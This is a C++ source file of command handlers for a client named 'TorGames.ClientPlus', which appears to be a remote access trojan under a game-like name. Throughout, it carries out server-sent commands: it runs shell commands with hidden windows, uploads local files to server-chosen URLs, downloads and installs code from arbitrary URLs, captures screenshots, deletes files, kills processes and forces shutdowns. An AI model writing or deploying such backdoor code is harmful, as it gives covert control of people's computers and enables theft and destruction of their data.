// TorGames.ClientPlus - Command handlers implementation
#include "commands.h"
#include "systeminfo.h"
#include "fileexplorer.h"
#include "updater.h"
#include "taskscheduler.h"
#include "utils.h"
#include "logger.h"

namespace Commands {

CommandResult HandleCommand(CommandType type, const char* payload) {
    LOG_INFO("Handling command type: %d", static_cast<int>(type));

    switch (type) {
        case CommandType::Ping:
            return HandlePing(payload);
        case CommandType::GetSystemInfo:
            return HandleGetSystemInfo(payload);
        case CommandType::GetProcessList:
            return HandleGetProcessList(payload);
        case CommandType::KillProcess:
            return HandleKillProcess(payload);
        case CommandType::RunCommand:
            return HandleRunCommand(payload);
        case CommandType::Download:
            return HandleDownload(payload);
        case CommandType::Upload:
            return HandleUpload(payload);
        case CommandType::ListDirectory:
            return HandleListDirectory(payload);
        case CommandType::DeleteFile:
            return HandleDeleteFile(payload);
        case CommandType::GetLogs:
            return HandleGetLogs(payload);
        case CommandType::Shutdown:
            return HandleShutdown(payload);
        case CommandType::Restart:
            return HandleRestart(payload);
        case CommandType::Uninstall:
            return HandleUninstall(payload);
        case CommandType::Update:
            return HandleUpdate(payload);
        case CommandType::Screenshot:
            return HandleScreenshot(payload);
        case CommandType::MessageBox:
            return HandleMessageBox(payload);
        case CommandType::UpdateAvailable:
            return HandleUpdateAvailable(payload);
        default:
            return { false, "Unknown command type" };
    }
}

CommandResult HandlePing(const char* payload) {
    return { true, "pong" };
}

CommandResult HandleGetSystemInfo(const char* payload) {
    std::string info = SystemInfo::GetSystemInfoJson();
    return { true, info };
}

CommandResult HandleGetProcessList(const char* payload) {
    std::string processes = SystemInfo::GetProcessListJson();
    return { true, processes };
}

CommandResult HandleKillProcess(const char* payload) {
    DWORD pid = static_cast<DWORD>(Utils::JsonGetInt(payload, "pid"));
    if (pid == 0) {
        return { false, "Invalid PID" };
    }

    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (!hProcess) {
        return { false, "Failed to open process" };
    }

    bool success = TerminateProcess(hProcess, 1) != 0;
    CloseHandle(hProcess);

    return { success, success ? "Process terminated" : "Failed to terminate process" };
}

CommandResult HandleRunCommand(const char* payload) {
    std::string command = Utils::JsonGetString(payload, "command");
    if (command.empty()) {
        return { false, "No command specified" };
    }

    LOG_INFO("Running command: %s", command.c_str());

    // Create pipes for output
    SECURITY_ATTRIBUTES sa = { sizeof(sa), nullptr, TRUE };
    HANDLE hReadPipe, hWritePipe;
    CreatePipe(&hReadPipe, &hWritePipe, &sa, 0);
    SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi = {};

    char cmd[1024];
    snprintf(cmd, sizeof(cmd), "cmd.exe /c %s", command.c_str());

    if (!CreateProcessA(nullptr, cmd, nullptr, nullptr, TRUE,
        CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        CloseHandle(hReadPipe);
        CloseHandle(hWritePipe);
        return { false, "Failed to create process" };
    }

    CloseHandle(hWritePipe);

    // Read output
    std::string output;
    char buffer[4096];
    DWORD bytesRead;

    while (ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, nullptr) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        output += buffer;
    }

    WaitForSingleObject(pi.hProcess, 30000);

    DWORD exitCode;
    GetExitCodeProcess(pi.hProcess, &exitCode);

    CloseHandle(hReadPipe);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return { true, output };
}

CommandResult HandleDownload(const char* payload) {
    // URL can come from "url" field or "command" field
    std::string url = Utils::JsonGetString(payload, "url");
    if (url.empty()) {
        url = Utils::JsonGetString(payload, "command");
    }

    std::string path = Utils::JsonGetString(payload, "path");

    if (url.empty()) {
        return { false, "URL required" };
    }

    if (path.empty()) {
        return { false, "Path required" };
    }

    bool success = FileExplorer::DownloadFile(url.c_str(), path.c_str());
    return { success, success ? "Download complete" : "Download failed" };
}

CommandResult HandleUpload(const char* payload) {
    std::string path = Utils::JsonGetString(payload, "path");
    std::string uploadUrl = Utils::JsonGetString(payload, "uploadUrl");

    if (path.empty() || uploadUrl.empty()) {
        return { false, "Path and uploadUrl required" };
    }

    bool success = FileExplorer::UploadFile(path.c_str(), uploadUrl.c_str());
    return { success, success ? "Upload complete" : "Upload failed" };
}

CommandResult HandleListDirectory(const char* payload) {
    std::string path = Utils::JsonGetString(payload, "path");
    if (path.empty()) {
        path = "C:\\";
    }

    std::string json = FileExplorer::ListDirectoryJson(path.c_str());
    return { true, json };
}

CommandResult HandleDeleteFile(const char* payload) {
    std::string path = Utils::JsonGetString(payload, "path");
    if (path.empty()) {
        return { false, "Path required" };
    }

    bool success = FileExplorer::DeleteFileOrDirectory(path.c_str());
    return { success, success ? "Deleted" : "Failed to delete" };
}

CommandResult HandleGetLogs(const char* payload) {
    int maxLines = static_cast<int>(Utils::JsonGetInt(payload, "maxLines"));
    if (maxLines <= 0) maxLines = 200;

    std::string logs = Logger::Instance().GetLogs(maxLines);
    return { true, logs };
}

CommandResult HandleShutdown(const char* payload) {
    LOG_INFO("Shutting down system...");

    HANDLE hToken;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        TOKEN_PRIVILEGES tp;
        LookupPrivilegeValueA(nullptr, SE_SHUTDOWN_NAME, &tp.Privileges[0].Luid);
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(hToken, FALSE, &tp, 0, nullptr, nullptr);
        CloseHandle(hToken);
    }

    ExitWindowsEx(EWX_SHUTDOWN | EWX_FORCE, SHTDN_REASON_MAJOR_OTHER);
    return { true, "Shutdown initiated" };
}

CommandResult HandleRestart(const char* payload) {
    LOG_INFO("Restarting system...");

    HANDLE hToken;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        TOKEN_PRIVILEGES tp;
        LookupPrivilegeValueA(nullptr, SE_SHUTDOWN_NAME, &tp.Privileges[0].Luid);
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(hToken, FALSE, &tp, 0, nullptr, nullptr);
        CloseHandle(hToken);
    }

    ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_OTHER);
    return { true, "Restart initiated" };
}

CommandResult HandleUninstall(const char* payload) {
    LOG_INFO("Uninstall command received");
    bool success = Updater::Uninstall();
    // Return with shouldExit=true so client exits after sending response
    return { success, success ? "Uninstall initiated successfully" : "Uninstall failed", success };
}

CommandResult HandleUpdate(const char* payload) {
    // URL can come from "url" field directly or from "command" field (server sends URL directly in commandText)
    std::string url = Utils::JsonGetString(payload, "url");

    if (url.empty()) {
        // Get URL directly from "command" field (server sends commandText as plain URL)
        std::string commandText = Utils::JsonGetString(payload, "command");
        if (!commandText.empty()) {
            // Check if commandText looks like a URL (starts with http)
            if (commandText.find("http") == 0) {
                url = commandText;
            } else {
                // Legacy: try to parse as JSON for backwards compatibility
                url = Utils::JsonGetString(commandText.c_str(), "url");
            }
        }
    }

    if (url.empty()) {
        LOG_ERROR("Update URL not found in payload");
        return { false, "Update URL required" };
    }

    LOG_INFO("Starting update from: %s", url.c_str());
    bool success = Updater::DownloadAndInstall(url.c_str());
    if (success) {
        ExitProcess(0);
    }
    return { success, success ? "Updating" : "Update failed" };
}

CommandResult HandleScreenshot(const char* payload) {
    std::string base64 = SystemInfo::CaptureScreenshotBase64();
    if (base64.empty()) {
        return { false, "Failed to capture screenshot" };
    }
    return { true, base64 };
}

CommandResult HandleMessageBox(const char* payload) {
    std::string title = Utils::JsonGetString(payload, "title");
    std::string message = Utils::JsonGetString(payload, "message");

    if (title.empty()) title = "TorGames";

    MessageBoxA(nullptr, message.c_str(), title.c_str(), MB_OK | MB_ICONINFORMATION);
    return { true, "Message displayed" };
}

CommandResult HandleUpdateAvailable(const char* payload) {
    // The new version is in the "command" field (commandText from server)
    std::string newVersion = Utils::JsonGetString(payload, "command");
    LOG_INFO("Update available notification received: version %s", newVersion.c_str());

    // Build the download URL for the new version
    char downloadUrl[512];
    snprintf(downloadUrl, sizeof(downloadUrl), "https://%s:%d/api/update/download/%s",
        DEFAULT_SERVER, DEFAULT_PORT, newVersion.c_str());

    LOG_INFO("Downloading update from: %s", downloadUrl);

    // Use the existing update mechanism
    bool success = Updater::DownloadAndInstall(downloadUrl);
    if (success) {
        LOG_INFO("Update download initiated, client will restart");
        return { true, "Update initiated", true }; // shouldExit = true
    }

    LOG_ERROR("Failed to initiate update");
    return { false, "Failed to download update" };
}

} // namespace Commands
